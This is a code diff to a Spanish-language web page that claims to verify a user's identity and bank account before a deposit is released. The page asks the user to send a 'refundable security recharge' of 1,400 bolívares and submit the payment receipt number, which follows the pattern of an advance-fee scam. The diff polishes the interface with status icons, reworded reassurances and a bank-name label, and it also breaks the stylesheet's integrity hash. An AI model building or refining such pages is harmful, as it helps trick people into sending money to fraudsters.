@@ -11,7 +11,7 @@
   <link 
     rel="stylesheet" 
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" 
-    integrity="sha512-R4p+3pVNe8+zWXEZUg9D3z+m5wK/5qOPkKgjAlc4E+r4QIxv4Wp6NUsAzWRvHWDYRexvbJR67vF9p/L+0N4R0Q==" 
+    integrity="sha512-R4p+3pVNe8+zWXEZUg9D3z+m5wK/5qOPkKKgjAlc4E+r4QIxv4Wp6NUsAzWRvHWDYRexvbJR67vF9p/L+0N4R0Q==" 
     crossorigin="anonymous" 
     referrerpolicy="no-referrer"
   />
@@ -396,7 +396,10 @@
       position: relative;
       box-shadow: 0 8px 16px rgba(0,0,0,0.2);
       animation: fadeInScale 0.4s ease;
-      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
     }
 
     @keyframes fadeInScale {
@@ -409,7 +412,8 @@
       border: none;
       font-size: 1.3rem;
       position: absolute;
-      top: 1rem; right: 1rem;
+      top: 1rem; 
+      right: 1rem;
       cursor: pointer;
       color: var(--text-light);
     }
@@ -433,6 +437,7 @@
       font-weight: 700;
       color: var(--secondary);
       margin-bottom: 1rem;
+      text-align: center;
     }
 
     .unified-text {
@@ -621,9 +626,11 @@
       padding: 0;
     }
     .verif-card li {
-      margin-bottom: 0.3rem;
+      margin-bottom: 0.6rem;
       font-size: 0.95rem;
       line-height: 1.3;
+      display: flex;
+      align-items: center;
     }
 
     /****************************************************
@@ -735,6 +742,7 @@
       margin: 1.5rem auto;
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       animation: fadeInUp 0.4s ease;
+      text-align: left; /* Alineación para mantener consistencia con secciones anteriores */
     }
     .final-recharge-data h3 {
       text-align: center;
@@ -1358,17 +1366,17 @@
             <div class="verif-card">
               <h3>Lo Aprobado</h3>
               <ul>
-                <li>Identidad del usuario</li>
-                <li>El monto del depósito</li>
-                <li>La cuenta bancaria proporcionada</li>
+                <li><i class="fas fa-check-circle" style="color: #00A976; margin-right: 6px;"></i>Identidad del usuario</li>
+                <li><i class="fas fa-check-circle" style="color: #00A976; margin-right: 6px;"></i>El monto del depósito</li>
+                <li><i class="fas fa-check-circle" style="color: #00A976; margin-right: 6px;"></i>La cuenta bancaria proporcionada</li>
               </ul>
             </div>
             <!-- 3) Lo pendiente -->
             <div class="verif-card">
               <h3>Lo Pendiente</h3>
               <ul>
-                <li>Proceso de seguridad adicional (monto elevado)</li>
-                <li>Verificación de la firma digital</li>
+                <li><i class="fas fa-exclamation-circle" style="color: #F7B600; margin-right: 6px;"></i>Proceso de seguridad adicional (monto elevado)</li>
+                <li><i class="fas fa-exclamation-circle" style="color: #F7B600; margin-right: 6px;"></i>Verificación de la firma digital</li>
               </ul>
             </div>
           </div>
@@ -1418,7 +1426,7 @@
         <div class="what-to-do-card" id="whatToDoCard" style="display:none;">
           <div class="what-to-do-title">¿Qué necesitas hacer?</div>
           <div class="what-to-do-content">
-            Para verificar que no se suplante tu identidad y que tienes control sobre tu cuenta bancaria, 
+            Para verificar que nadie esté suplantando tu identidad y comprobar que tienes el control sobre tu cuenta bancaria, 
             debes realizar una recarga de seguridad desde la <strong>misma cuenta</strong> 
             donde recibirás tus fondos, por un monto de <strong id="recargaBs">1.400,00 Bolívares</strong>. 
             Esta recarga es <strong>reembolsable</strong>; se te devolverá junto con tu depósito final. 
@@ -1463,12 +1471,13 @@
 
           <div class="form-group" style="margin-top:1rem;">
             <label for="verifNumeroComprobante">
-              <i class="fas fa-file-invoice"></i> Nº de Comprobante (mín. 12 dígitos)
+              <i class="fas fa-file-invoice"></i> 
+              Comprobante de Pago Móvil del <span id="finalBankNameForReceipt" style="font-weight:bold;"></span>
             </label>
             <input 
               type="text" 
               id="verifNumeroComprobante" 
-              placeholder="Ej: 012345678901" 
+              placeholder="Ej: 012345678901 (mín. 12 dígitos)" 
               required
             />
           </div>
@@ -1565,6 +1574,7 @@
     const finalPhone = document.getElementById('finalPhone');
     const finalCedula = document.getElementById('finalCedula');
     const verifNumeroComprobante = document.getElementById('verifNumeroComprobante');
+    const finalBankNameForReceipt = document.getElementById('finalBankNameForReceipt');
 
     // Control del "confirm step"
     let confirmStep = 1;
@@ -1894,6 +1904,9 @@
       const phone = document.getElementById('phoneNumber').value;
       finalPhone.textContent = prefix + '-' + phone;
       finalCedula.textContent = cedulaVal;
+
+      // También mostrar en la etiqueta final (Comprobante de Pago Móvil del X)
+      finalBankNameForReceipt.textContent = bankNameText || 'tu banco';
 
       // ===== Cálculo dinámico =====
       // El monto fijo de recarga: 1400
